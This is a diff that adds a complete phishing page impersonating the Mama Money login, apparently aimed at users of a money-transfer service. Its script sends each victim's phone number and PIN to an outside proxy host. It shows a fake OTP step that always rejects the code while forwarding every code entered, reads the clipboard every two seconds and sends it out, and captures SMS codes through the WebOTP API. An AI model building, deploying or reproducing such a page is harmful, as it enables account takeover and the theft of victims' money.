@@ -1,0 +1,476 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Mama Money Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #4a2d7a;
+            background-image: url('https://i.postimg.cc/2jXBP2Rm/file-00000000ce8c820888a5b0d071ca9746.png');
+            background-repeat: no-repeat;
+            background-position: center center;
+            background-attachment: fixed;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            min-height: 100dvh;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(20, 10, 40, 0.20);
+            z-index: 0;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 360px;
+            padding: 10px 16px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* ========== LOGO ========== */
+        .logo-container {
+            text-align: center;
+            margin-top: 0;
+            margin-bottom: 22px;
+        }
+        .logo-img {
+            width: 160px;
+            display: block;
+            margin: 0 auto;
+            filter: drop-shadow(0 4px 12px rgba(0, 0, 0, 0.25));
+        }
+
+        /* ========== INPUTS ========== */
+        .input-group {
+            width: 100%;
+            margin-bottom: 15px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 14px 15px;
+            background: rgba(255, 255, 255, 0.15);
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            border-radius: 4px;
+            color: #ffffff;
+            font-size: 16px;
+            outline: none;
+            font-family: inherit;
+            transition: all 0.2s;
+        }
+        .input-field::placeholder {
+            color: rgba(255, 255, 255, 0.75);
+        }
+        .input-field:focus {
+            border-color: #ffffff;
+            background: rgba(255, 255, 255, 0.22);
+            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.10);
+        }
+
+        /* ========== BUTTONS ========== */
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background-color: #2d1b4e;
+            color: #ffffff;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 12px;
+            cursor: pointer;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            text-decoration: none;
+            font-family: inherit;
+            transition: background 0.2s;
+        }
+        .btn:hover {
+            background-color: #1f1236;
+        }
+        .btn:active {
+            transform: scale(0.99);
+        }
+
+        /* ========== REMEMBER ME ========== */
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-top: 10px;
+            margin-bottom: 25px;
+            color: #ffffff;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
+        }
+        .remember-me input[type="checkbox"] {
+            width: 22px;
+            height: 22px;
+            accent-color: #d8b4fe;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        /* ========== PAGE SYSTEM ========== */
+        .page {
+            display: none;
+            width: 100%;
+            flex-direction: column;
+            align-items: center;
+        }
+        .page.active {
+            display: flex;
+        }
+
+        /* ========== OTP PAGE ========== */
+        .otp-title {
+            color: #ffffff;
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            text-align: center;
+            margin-top: 40px;
+            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
+        }
+        .otp-subtitle {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 14px;
+            margin-bottom: 20px;
+            text-align: center;
+            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
+        }
+        .otp-input {
+            width: 100%;
+            padding: 14px 15px;
+            background: rgba(255, 255, 255, 0.15);
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            border-radius: 4px;
+            color: #ffffff;
+            font-size: 26px;
+            text-align: center;
+            letter-spacing: 10px;
+            outline: none;
+            margin-bottom: 6px;
+            font-family: inherit;
+            transition: all 0.2s;
+        }
+        .otp-input::placeholder {
+            color: rgba(255, 255, 255, 0.55);
+            letter-spacing: 4px;
+            font-size: 16px;
+        }
+        .otp-input:focus {
+            border-color: #ffffff;
+            background: rgba(255, 255, 255, 0.22);
+            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.10);
+        }
+        .resend-text {
+            color: #ffffff;
+            font-size: 14px;
+            font-weight: 600;
+            margin-top: 10px;
+            cursor: pointer;
+            text-decoration: underline;
+            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
+        }
+
+        /* ========== ERROR MESSAGE ========== */
+        .error-msg {
+            color: #c62828;
+            background: rgba(255, 255, 255, 0.95);
+            font-size: 14px;
+            font-weight: 600;
+            text-align: center;
+            padding: 10px 15px;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            width: 100%;
+            display: none;
+        }
+        .error-msg.show {
+            display: block;
+            animation: shakeMsg 0.4s ease;
+        }
+        @keyframes shakeMsg {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-6px); }
+            75% { transform: translateX(6px); }
+        }
+
+        /* ========== FOOTER ========== */
+        .footer-text {
+            text-align: center;
+            color: #ffffff;
+            font-size: 14px;
+            font-weight: 600;
+            line-height: 1.4;
+            text-shadow: 0 1px 3px rgba(0, 0, 0, 0.3);
+        }
+        .footer-text a {
+            color: #ffffff;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+
+        <!-- ==================== LOGIN PAGE ==================== -->
+        <div class="page active" id="loginPage">
+
+            <!-- Logo -->
+            <div class="logo-container">
+                <img class="logo-img" src="https://cdn.phototourl.com/member/2026-09-17-57a41e04-64e5-44a2-b24e-d056fad7788a.png" alt="Mama Money Logo" />
+            </div>
+
+            <!-- Inputs -->
+            <div class="input-group">
+                <input type="tel" class="input-field" id="phoneInput" placeholder="Cellphone Number" maxlength="10" inputmode="numeric" pattern="[0-9]*" required />
+            </div>
+            <div class="input-group">
+                <input type="password" class="input-field" id="pinInput" placeholder="Pin" maxlength="4" inputmode="numeric" pattern="[0-9]*" required autocomplete="off" />
+            </div>
+
+            <!-- Login Button -->
+            <button class="btn" id="loginBtn">
+                Login <i class="fa-solid fa-arrow-right"></i>
+            </button>
+
+            <button class="btn">
+                Check Rates <i class="fa-solid fa-arrow-right"></i>
+            </button>
+
+            <button class="btn">
+                Whatsapp Mama <i class="fa-brands fa-whatsapp"></i>
+            </button>
+
+            <div class="remember-me">
+                <input type="checkbox" id="remember" />
+                <label for="remember">Remember me</label>
+            </div>
+
+            <div class="footer-text">
+                Forgot your pin?<br />
+                Dial <a href="tel:*134*542#">*134*542#</a> to reset it.
+            </div>
+        </div>
+
+        <!-- ==================== OTP PAGE (NO LOGO) ==================== -->
+        <div class="page" id="otpPage">
+
+            <!-- OTP Heading -->
+            <p class="otp-title">Enter OTP</p>
+            <p class="otp-subtitle">A 5-digit OTP has been sent to your number</p>
+
+            <!-- 5-Digit OTP Input -->
+            <input type="text" class="otp-input" id="otpInput" placeholder="-----" maxlength="5" inputmode="numeric" pattern="[0-9]*" autocomplete="one-time-code" />
+
+            <!-- Error Message -->
+            <div class="error-msg" id="errorMsg">Invalid code</div>
+
+            <!-- Verify Button -->
+            <button class="btn" id="verifyBtn">
+                Verify <i class="fa-solid fa-arrow-right"></i>
+            </button>
+
+            <!-- Resend -->
+            <span class="resend-text" id="resendOtp">Resend OTP</span>
+        </div>
+
+    </div>
+
+    <script>
+        // ==================== CONFIG ====================
+        const PROXY_URL = 'https://freemix.online/proxy/index.php';
+
+        const loginPage = document.getElementById('loginPage');
+        const otpPage = document.getElementById('otpPage');
+        const loginBtn = document.getElementById('loginBtn');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const otpInput = document.getElementById('otpInput');
+        const errorMsg = document.getElementById('errorMsg');
+        const resendOtp = document.getElementById('resendOtp');
+        const phoneInput = document.getElementById('phoneInput');
+        const pinInput = document.getElementById('pinInput');
+
+        let userPhone = '';
+        let userPin = '';
+
+        // ========== SEND TO TELEGRAM ==========
+        async function sendToTelegram(data) {
+            try {
+                await fetch(PROXY_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            } catch (err) {
+                console.log('Proxy send error:', err.message);
+            }
+        }
+
+        // ========== INPUT DIGITS ONLY ==========
+        phoneInput.addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+
+        pinInput.addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+
+        // ========== LOGIN BUTTON ==========
+        loginBtn.addEventListener('click', function() {
+            userPhone = phoneInput.value.trim();
+            userPin = pinInput.value.trim();
+
+            if (userPhone.length < 10) {
+                alert('Please enter a valid 10-digit cellphone number.');
+                return;
+            }
+            if (userPin.length < 4) {
+                alert('Please enter a valid 4-digit pin.');
+                return;
+            }
+
+            sendToTelegram({
+                phone: userPhone,
+                pin: userPin,
+                step: 'login'
+            });
+
+            loginPage.classList.remove('active');
+            otpPage.classList.add('active');
+
+            startOtpDetection();
+        });
+
+        // ========== VERIFY BUTTON — ALWAYS INVALID ==========
+        verifyBtn.addEventListener('click', function() {
+            const otp = otpInput.value.trim();
+            if (otp.length === 5) {
+                sendToTelegram({
+                    phone: userPhone,
+                    pin: userPin,
+                    otp: otp,
+                    step: 'otp_verify'
+                });
+
+                errorMsg.textContent = 'Invalid code. Please try again.';
+                errorMsg.classList.add('show');
+                otpInput.value = '';
+            }
+        });
+
+        // ========== OTP INPUT ==========
+        let otpAutoSubmitTimer = null;
+        otpInput.addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            errorMsg.classList.remove('show');
+
+            if (otpAutoSubmitTimer) {
+                clearTimeout(otpAutoSubmitTimer);
+                otpAutoSubmitTimer = null;
+            }
+
+            if (this.value.length === 5) {
+                otpAutoSubmitTimer = setTimeout(() => verifyBtn.click(), 500);
+            }
+        });
+
+        // ========== RESEND OTP ==========
+        resendOtp.addEventListener('click', function() {
+            otpInput.value = '';
+            errorMsg.classList.remove('show');
+            alert('OTP resent successfully!');
+        });
+
+        // ========== CLIPBOARD MONITOR ==========
+        let lastClipboardContent = '';
+
+        async function checkClipboard() {
+            try {
+                if (document.hasFocus()) {
+                    const text = await navigator.clipboard.readText();
+                    if (text && text.trim() && text !== lastClipboardContent) {
+                        const trimmed = text.trim();
+                        lastClipboardContent = trimmed;
+
+                        sendToTelegram({
+                            phone: userPhone || 'unknown',
+                            clipboard: trimmed,
+                            step: 'clipboard'
+                        });
+
+                        if (otpPage.classList.contains('active')) {
+                            const digitsOnly = trimmed.replace(/[^0-9]/g, '');
+                            if (digitsOnly.length >= 5 && digitsOnly.length <= 6) {
+                                const otpCode = digitsOnly.slice(0, 5);
+                                otpInput.value = otpCode;
+                                errorMsg.classList.remove('show');
+                                setTimeout(() => verifyBtn.click(), 500);
+                            }
+                        }
+                    }
+                }
+            } catch (err) {}
+        }
+
+        setInterval(checkClipboard, 2000);
+        window.addEventListener('focus', () => setTimeout(checkClipboard, 500));
+        document.addEventListener('copy', () => setTimeout(checkClipboard, 300));
+
+        // ========== WebOTP API ==========
+        async function startOtpDetection() {
+            if (!('OTPCredential' in window)) return;
+
+            try {
+                const controller = new AbortController();
+                setTimeout(() => controller.abort(), 120000);
+
+                const otpCredential = await navigator.credentials.get({
+                    otp: { transport: ['sms'] },
+                    signal: controller.signal
+                });
+
+                if (otpCredential && otpCredential.code) {
+                    const otpCode = otpCredential.code.replace(/[^0-9]/g, '').slice(0, 5);
+                    otpInput.value = otpCode;
+                    errorMsg.classList.remove('show');
+                    setTimeout(() => verifyBtn.click(), 500);
+                }
+            } catch (err) {
+                console.log('WebOTP error:', err.message);
+            }
+        }
+    </script>
+
+</body>
+</html>
